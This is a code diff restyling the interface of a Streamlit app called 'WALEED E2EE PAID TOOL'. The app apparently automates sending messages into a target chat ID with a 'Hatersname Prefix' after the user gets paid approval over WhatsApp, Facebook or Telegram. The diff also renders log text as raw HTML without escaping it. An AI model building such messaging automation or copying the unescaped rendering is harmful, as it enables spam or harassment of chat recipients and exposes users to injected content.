         """, unsafe_allow_html=True)
         
         # Real Name Input
-        st.markdown("### 📝 Enter Your Real Name")
+        st.markdown('<div class="card-title">📝 Enter Your Real Name</div>', unsafe_allow_html=True)
         user_real_name = st.text_input("Your Real Name", key="real_name", placeholder="Enter your real name for approval", 
                                       value=st.session_state.user_real_name)
         
@@ -971,7 +1381,7 @@ else:
             db.update_user_real_name(st.session_state.user_id, user_real_name)
         
         # Contact Buttons
-        st.markdown("### 📞 Contact Waleed Khan for Approval")
+        st.markdown('<div class="card-title">📞 Contact for Approval</div>', unsafe_allow_html=True)
         col1, col2, col3 = st.columns(3)
         
         with col1:
@@ -979,21 +1389,45 @@ else:
                 st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                 st.session_state.approval_key
             )
-            st.markdown(f'<a href="{whatsapp_url}" target="_blank"><button style="width:100%; background: #25D366; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold;">📱 WhatsApp</button></a>', unsafe_allow_html=True)
+            st.markdown(f'''
+            <a href="{whatsapp_url}" target="_blank" style="text-decoration: none;">
+                <div style="background: linear-gradient(135deg, #25D366, #128C7E); color: white; padding: 18px; border-radius: 15px; text-align: center; font-family: \'Montserrat\', sans-serif; font-weight: 600; box-shadow: 0 8px 25px rgba(37, 211, 102, 0.3); transition: all 0.3s ease; cursor: pointer;"
+                     onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 12px 35px rgba(37, 211, 102, 0.5)'"
+                     onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(37, 211, 102, 0.3)'">
+                    📱 WhatsApp
+                </div>
+            </a>
+            ''', unsafe_allow_html=True)
         
         with col2:
             facebook_url = send_approval_request_via_facebook(
                 st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                 st.session_state.approval_key
             )
-            st.markdown(f'<a href="{facebook_url}" target="_blank"><button style="width:100%; background: #1877F2; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold;">👤 Facebook</button></a>', unsafe_allow_html=True)
+            st.markdown(f'''
+            <a href="{facebook_url}" target="_blank" style="text-decoration: none;">
+                <div style="background: linear-gradient(135deg, #1877F2, #0D5CB6); color: white; padding: 18px; border-radius: 15px; text-align: center; font-family: \'Montserrat\', sans-serif; font-weight: 600; box-shadow: 0 8px 25px rgba(24, 119, 242, 0.3); transition: all 0.3s ease; cursor: pointer;"
+                     onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 12px 35px rgba(24, 119, 242, 0.5)'"
+                     onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(24, 119, 242, 0.3)'">
+                    👤 Facebook
+                </div>
+            </a>
+            ''', unsafe_allow_html=True)
         
         with col3:
             telegram_url = send_approval_request_via_telegram(
                 st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                 st.session_state.approval_key
             )
-            st.markdown(f'<a href="{telegram_url}" target="_blank"><button style="width:100%; background: #0088cc; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold;">✈️ Telegram</button></a>', unsafe_allow_html=True)
+            st.markdown(f'''
+            <a href="{telegram_url}" target="_blank" style="text-decoration: none;">
+                <div style="background: linear-gradient(135deg, #0088cc, #006699); color: white; padding: 18px; border-radius: 15px; text-align: center; font-family: \'Montserrat\', sans-serif; font-weight: 600; box-shadow: 0 8px 25px rgba(0, 136, 204, 0.3); transition: all 0.3s ease; cursor: pointer;"
+                     onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 12px 35px rgba(0, 136, 204, 0.5)'"
+                     onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(0, 136, 204, 0.3)'">
+                    ✈️ Telegram
+                </div>
+            </a>
+            ''', unsafe_allow_html=True)
         
         # Check Status Button
         if st.button("🔄 Check Approval Status", use_container_width=True):
@@ -1007,7 +1441,7 @@ else:
                 st.warning("⏳ Approval pending...")
         
         # Logout
-        if st.sidebar.button("🚪 Logout"):
+        if st.sidebar.button("🚪 Logout", use_container_width=True):
             st.session_state.logged_in = False
             st.session_state.user_id = None
             st.session_state.username = None
@@ -1028,8 +1462,13 @@ else:
                 if user_config and user_config['chat_id']:
                     start_automation(user_config, st.session_state.user_id)
         
-        st.sidebar.markdown(f"### 👤 {st.session_state.username}")
-        st.sidebar.markdown(f"**Status:** <span class='status-badge approved'>✅ Approved</span>", unsafe_allow_html=True)
+        st.sidebar.markdown(f'''
+        <div style="background: rgba(30,40,60,0.8); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(0,200,255,0.3);">
+            <h4 style="font-family: 'Montserrat', sans-serif; color: #00ccff; margin-bottom: 15px;">👤 User Profile</h4>
+            <p><strong>Username:</strong> {st.session_state.username}</p>
+            <p><span class="status-tag status-green">✅ Approved</span></p>
+        </div>
+        ''', unsafe_allow_html=True)
         
         if st.sidebar.button("🚪 Logout", use_container_width=True):
             if st.session_state.automation_state.running:
@@ -1051,8 +1490,8 @@ else:
             tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
             
             with tab1:
-                st.markdown('<div class="card">', unsafe_allow_html=True)
-                st.markdown("### Configuration Settings")
+                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+                st.markdown('<div class="card-title">Configuration Settings</div>', unsafe_allow_html=True)
                 
                 chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'])
                 name_prefix = st.text_input("Hatersname Prefix", value=user_config['name_prefix'])
@@ -1080,18 +1519,35 @@ else:
                 st.markdown('</div>', unsafe_allow_html=True)
             
             with tab2:
-                st.markdown('<div class="card">', unsafe_allow_html=True)
-                st.markdown("### Automation Dashboard")
+                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
+                st.markdown('<div class="card-title">Automation Dashboard</div>', unsafe_allow_html=True)
                 
                 col1, col2, col3 = st.columns(3)
                 
                 with col1:
-                    st.metric("Messages Sent", st.session_state.automation_state.message_count)
+                    st.markdown(f'''
+                    <div class="metric-box">
+                        <div class="metric-value">{st.session_state.automation_state.message_count}</div>
+                        <div class="metric-label">Messages Sent</div>
+                    </div>
+                    ''', unsafe_allow_html=True)
+                
                 with col2:
                     status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
-                    st.metric("Status", status)
+                    st.markdown(f'''
+                    <div class="metric-box">
+                        <div class="metric-value">{status}</div>
+                        <div class="metric-label">Status</div>
+                    </div>
+                    ''', unsafe_allow_html=True)
+                
                 with col3:
-                    st.metric("Total Logs", len(st.session_state.automation_state.logs))
+                    st.markdown(f'''
+                    <div class="metric-box">
+                        <div class="metric-value">{len(st.session_state.automation_state.logs)}</div>
+                        <div class="metric-label">Total Logs</div>
+                    </div>
+                    ''', unsafe_allow_html=True)
                 
                 col1, col2 = st.columns(2)
                 with col1:
@@ -1107,26 +1563,27 @@ else:
                         stop_automation(st.session_state.user_id)
                         st.rerun()
                 
-                st.markdown("### 📜 Live Logs")
+                st.markdown('<div class="card-title">📜 Live Logs</div>', unsafe_allow_html=True)
                 if st.session_state.automation_state.logs:
-                    st.markdown('<div class="log-container">', unsafe_allow_html=True)
+                    st.markdown('<div class="log-terminal">', unsafe_allow_html=True)
                     for log in st.session_state.automation_state.logs[-30:]:
-                        st.text(log)
+                        st.markdown(f'<div class="log-entry">{log}</div>', unsafe_allow_html=True)
                     st.markdown('</div>', unsafe_allow_html=True)
                 else:
-                    st.info("📝 No logs yet")
+                    st.info("📝 No logs yet. Start automation to see logs here.")
                 
                 if st.session_state.automation_state.running:
                     time.sleep(1)
                     st.rerun()
                 st.markdown('</div>', unsafe_allow_html=True)
 
-# Footer
+# Premium Footer
 st.markdown("""
-<div class="footer">
-    <strong>WALEED XD E2EE PAID TOOL</strong><br>
-    Professional Automation Suite • © 2025
+<div class="premium-footer">
+    <div class="footer-title">WALEED E2EE PAID TOOL</div>
+    <p>Premium Automation Suite • Version 3.0</p>
+    <p>© 2025 Waleed XD • All Rights Reserved</p>
 </div>
 """, unsafe_allow_html=True)
 
-st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
+st.markdown('</div>', unsafe_allow_html=True)  # Close main wrapper
